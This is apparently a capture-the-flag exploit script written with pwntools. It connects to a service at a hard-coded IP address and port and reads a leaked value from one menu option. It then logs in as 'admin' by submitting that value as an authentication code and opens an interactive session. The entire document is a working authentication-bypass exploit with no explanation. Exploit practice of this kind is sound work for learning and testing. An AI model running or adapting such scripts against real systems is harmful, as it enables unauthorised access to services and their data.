from pwn import * 

io = remote('34.123.210.162', 20231)

    
io.sendlineafter(b':', b'2')
io.recvuntil(b'is: ')
code = u64(io.recvline().strip().ljust(8, b'\x00'))

io.sendlineafter(b':', b'1')
io.sendlineafter(b':', b'admin')
io.sendlineafter(b':', b'3')
io.sendlineafter(b'code:', str(code).encode())

info('code: %d', code)
io.interactive()